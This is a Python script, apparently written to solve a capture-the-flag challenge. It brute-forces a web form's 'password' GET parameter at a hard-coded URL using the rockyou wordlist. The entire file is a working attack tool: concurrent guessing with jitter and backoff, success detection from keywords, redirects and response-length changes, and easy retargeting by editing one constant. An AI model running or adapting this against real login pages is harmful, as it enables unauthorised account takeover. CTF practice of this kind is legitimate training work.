#!/usr/bin/env python3
import asyncio
import aiohttp
import async_timeout
import time
import random
import sys
from pathlib import Path
from typing import Optional, Tuple

# ======== CONFIGURE THESE ========
TARGET_URL = "https://vault.secso.cc/"  # <-- put the challenge URL here
PARAM_NAME = "password"              # GET parameter name as per the form
WORDLIST_PATH = "rockyou.txt"        # path to rockyou.txt (UTF-8 or latin-1)
MAX_ATTEMPTS = 1000                  # respect challenge budget
CONCURRENCY = 15                     # keep under 25 rps; 10–20 is safe
TIMEOUT = 8.0                        # per-request timeout (seconds)

# Success detection knobs (set one or more for faster, robust detection)
SUCCESS_KEYWORDS = ["success", "correct", "welcome", "flag", "congratulations"]  # case-insensitive
EXPECTED_STATUS = {200, 302}  # adjust if success triggers redirect or different code

# If you know a specific success path or redirect location, set it:
SUCCESS_REDIRECT_CONTAINS = None  # e.g., "/dashboard" or "/flag"
# =================================

def normalize_text(b: bytes) -> str:
    try:
        return b.decode("utf-8", errors="ignore")
    except UnicodeDecodeError:
        return b.decode("latin-1", errors="ignore")

async def fetch(session: aiohttp.ClientSession, pwd: str) -> Tuple[int, bytes, dict, Optional[str]]:
    # jitter to smooth RPS and avoid burst patterns
    await asyncio.sleep(random.uniform(0.0, 0.03))
    params = {PARAM_NAME: pwd}
    headers = {
        "User-Agent": "Mozilla/5.0 (bruteforce-research; +ctf)",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    }
    try:
        with async_timeout.timeout(TIMEOUT):
            resp = await session.get(TARGET_URL, params=params, headers=headers, allow_redirects=False)
            status = resp.status
            content = await resp.read()
            hdrs = dict(resp.headers)
            loc = hdrs.get("Location")
            return status, content, hdrs, loc
    except asyncio.TimeoutError:
        return 599, b"", {}, None
    except aiohttp.ClientError:
        return 598, b"", {}, None

def looks_success(
    status: int,
    body: bytes,
    headers: dict,
    location: Optional[str],
    baseline_len: int,
) -> bool:
    # 1) Redirect heuristic
    if location and SUCCESS_REDIRECT_CONTAINS and SUCCESS_REDIRECT_CONTAINS in location:
        return True
    # 2) Status code heuristic (if challenge uses special code)
    if EXPECTED_STATUS and status not in EXPECTED_STATUS:
        # If baseline was 200 and we get 302 specifically, this might be success.
        pass
    # 3) Keyword heuristic
    text = normalize_text(body).lower()
    if any(kw in text for kw in SUCCESS_KEYWORDS):
        return True
    # 4) Content-length delta heuristic (often success page differs notably)
    # tune the delta threshold if needed
    if baseline_len > 0:
        if abs(len(body) - baseline_len) >= max(50, int(0.08 * baseline_len)):
            return True
    return False

async def build_baseline(session: aiohttp.ClientSession) -> Tuple[int, int, dict, Optional[str]]:
    bogus = "this_is_definitely_wrong_" + str(random.getrandbits(32))
    status, body, headers, location = await fetch(session, bogus)
    return status, len(body), headers, location

async def producer(wordlist_path: str, limit: int, start: int = 0):
    # rockyou is latin-1 mostly; decode robustly and strip
    with open(wordlist_path, "rb") as f:
        idx = 0
        yielded = 0
        for raw in f:
            if yielded >= limit:
                break
            try:
                pwd = raw.rstrip(b"\r\n").decode("utf-8")
            except UnicodeDecodeError:
                pwd = raw.rstrip(b"\r\n").decode("latin-1", errors="ignore")
            if not pwd:
                continue
            if idx >= start:
                yield pwd
                yielded += 1
            idx += 1

async def main():
    if TARGET_URL.startswith("https://example.com"):
        print("Configure TARGET_URL before running.", file=sys.stderr)
        sys.exit(1)

    connector = aiohttp.TCPConnector(limit=CONCURRENCY)
    timeout = aiohttp.ClientTimeout(total=None)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        # Optional: warm-up request to set cookies
        await asyncio.sleep(0.05)
        baseline_status, baseline_len, baseline_headers, baseline_loc = await build_baseline(session)
        print(f"[+] Baseline: status={baseline_status} len={baseline_len} loc={baseline_loc}")

        sem = asyncio.Semaphore(CONCURRENCY)
        found = {"pwd": None}

        async def worker(pwd: str):
            # Simple retry with gentle backoff on 429/5xx to respect server limits
            delays = [0.0, 0.2, 0.5, 1.0]
            for attempt in range(len(delays)):
                async with sem:
                    status, body, headers, location = await fetch(session, pwd)
                if status in (429, 500, 502, 503, 504, 598, 599):
                    await asyncio.sleep(delays[attempt] + random.uniform(0.0, 0.05))
                    continue
                if looks_success(status, body, headers, location, baseline_len):
                    if found["pwd"] is None:  # first winner
                        found["pwd"] = pwd
                    return True
                return False
            return False

        tasks = []
        start_time = time.time()
        count = 0

        async for pwd in producer(WORDLIST_PATH, MAX_ATTEMPTS):
            if found["pwd"]:
                break
            tasks.append(asyncio.create_task(worker(pwd)))

            # Batch dispatch to keep memory and RPS in control
            if len(tasks) >= CONCURRENCY * 8:
                results = await asyncio.gather(*tasks)
                count += len(results)
                tasks.clear()
                # Light pacing to keep under ~20-22 RPS
                await asyncio.sleep(0.05)

        if tasks and not found["pwd"]:
            results = await asyncio.gather(*tasks)
            count += len(results)

        elapsed = time.time() - start_time
        print(f"[+] Tried {count} candidates in {elapsed:.2f}s")

        if found["pwd"]:
            print(f"[+] SUCCESS password: {found['pwd']}")
        else:
            print("[-] Not found within budget. Increase MAX_ATTEMPTS or refine heuristics.")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
